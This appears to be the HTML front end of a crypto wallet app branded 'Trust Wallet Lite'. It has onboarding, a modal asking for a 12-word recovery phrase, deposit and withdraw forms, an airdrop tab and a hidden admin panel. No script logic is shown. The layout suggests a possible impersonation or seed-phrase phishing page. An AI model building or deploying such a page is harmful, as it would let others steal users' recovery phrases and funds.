<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>Trust Wallet Lite • Secure Crypto Wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- ========== SPLASH SCREEN ========== -->
    <div id="splashScreen" class="splash-screen">
        <div class="splash-content">
            <div class="splash-logo"><i class="fas fa-shield-alt"></i></div>
            <h1>Trust Wallet Lite</h1>
            <div class="splash-spinner"></div>
            <div class="splash-version">v6.0</div>
        </div>
    </div>

    <!-- ========== ONBOARDING SCREEN ========== -->
    <div id="onboardingScreen" class="onboarding-screen" style="display: none;">
        <div class="onboarding-container">
            <div class="logo-icon-large"><i class="fas fa-shield-alt"></i></div>
            <h1>Trust Wallet Lite</h1>
            <p>The most trusted & secure crypto wallet</p>
            <div class="onboarding-buttons">
                <button id="createWalletBtn" class="btn-primary"><i class="fas fa-plus-circle"></i> Create a new wallet</button>
                <button id="importWalletBtn" class="btn-secondary"><i class="fas fa-arrow-right-to-bracket"></i> Import existing wallet</button>
            </div>
            <div class="onboarding-footer"><i class="fas fa-shield-alt"></i><span>Secure & Decentralized</span></div>
        </div>
    </div>

    <!-- ========== IMPORT WALLET MODAL ========== -->
    <div id="importModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-key"></i> Import Wallet</h3>
                <button class="close-modal" onclick="closeModal('importModal')"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <p>Enter your 12-word recovery phrase</p>
                <div class="words-grid" id="wordsGrid"></div>
                <button id="confirmImportBtn" class="btn-primary">Import Wallet</button>
            </div>
        </div>
    </div>

    <!-- ========== MAIN APP CONTENT ========== -->
    <div id="mainContent" class="main-content" style="display: none;">
        <!-- Header -->
        <div class="app-header">
            <div class="header-left">
                <div class="user-avatar" id="userAvatar">U</div>
                <div class="user-info">
                    <div class="username" id="userName">User</div>
                    <div class="user-id" id="userIdDisplay">ID: --------</div>
                </div>
            </div>
            <div class="header-actions">
                <button id="adminCrownBtn" class="icon-btn hidden"><i class="fa-solid fa-crown" style="color: gold;"></i></button>
                <button id="notificationBtn" class="icon-btn"><i class="fa-regular fa-bell"></i><span class="badge">0</span></button>
                <button id="refreshPricesBtn" class="icon-btn"><i class="fa-solid fa-rotate-right"></i></button>
                <button id="languageBtn" class="icon-btn"><span id="currentLanguageFlag">🇬🇧</span></button>
                <button id="themeBtn" class="icon-btn"><i class="fas fa-moon"></i></button>
            </div>
        </div>

        <div id="welcomeSticker" class="welcome-sticker"></div>

        <!-- Tab Contents -->
        <div id="walletSection" class="tab-content active">
            <div id="walletContainer"></div>
        </div>
        <div id="referralSection" class="tab-content hidden">
            <div id="referralContainer"></div>
        </div>
        <div id="twtpaySection" class="tab-content hidden">
            <div id="twtpayContainer"></div>
        </div>
        <div id="settingsSection" class="tab-content hidden">
            <div id="settingsContainer"></div>
        </div>

        <!-- Bottom Navigation -->
        <div class="bottom-nav">
            <button class="nav-item active" data-tab="wallet"><i class="fas fa-wallet"></i><span>Wallet</span></button>
            <button class="nav-item" data-tab="referral"><i class="fas fa-users"></i><span>Airdrop</span></button>
            <button class="nav-item" data-tab="twtpay"><i class="fas fa-credit-card"></i><span>TWT Pay</span></button>
            <button class="nav-item" data-tab="settings"><i class="fas fa-cog"></i><span>Settings</span></button>
        </div>
    </div>

    <!-- ========== MODALS ========== -->
    <div id="depositModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>Deposit</h3><button onclick="closeModal('depositModal')">×</button></div><div class="modal-body"><div class="address-box"><code id="depositAddress"></code><button onclick="copyDepositAddress()">Copy</button></div></div></div></div>
    <div id="withdrawModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>Withdraw</h3><button onclick="closeModal('withdrawModal')">×</button></div><div class="modal-body"><input type="number" id="withdrawAmount" placeholder="Amount"><input type="text" id="withdrawAddress" placeholder="Address"><button onclick="submitWithdraw()">Withdraw</button></div></div></div>
    <div id="sendModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>Send</h3><button onclick="closeModal('sendModal')">×</button></div><div class="modal-body"><input type="number" id="sendAmount" placeholder="Amount"><input type="text" id="sendAddress" placeholder="Address"><button onclick="sendTransaction()">Send</button></div></div></div>
    <div id="receiveModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>Receive</h3><button onclick="closeModal('receiveModal')">×</button></div><div class="modal-body"><code id="receiveAddress"></code><button onclick="copyAddress()">Copy</button></div></div></div>
    <div id="historyModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>History</h3><button onclick="closeModal('historyModal')">×</button></div><div class="modal-body"><div id="historyList"></div></div></div></div>
    <div id="notificationsModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>Notifications</h3><button onclick="closeModal('notificationsModal')">×</button></div><div class="modal-body"><div id="notificationsList"></div></div></div></div>
    <div id="adminPanel" class="admin-panel hidden"><div class="admin-header"><h3>Admin Panel</h3><button onclick="closeAdminPanel()">×</button></div><div id="adminContent"></div></div>

    <!-- Toast -->
    <div id="toast" class="toast hidden"><i class="fa-regular fa-circle-check"></i><span id="toastMessage"></span></div>
    <button id="scrollTopBtn" class="scroll-top-btn hidden" onclick="scrollToTop()"><i class="fas fa-arrow-up"></i></button>

    <script src="app.js"></script>
</body>
</html>
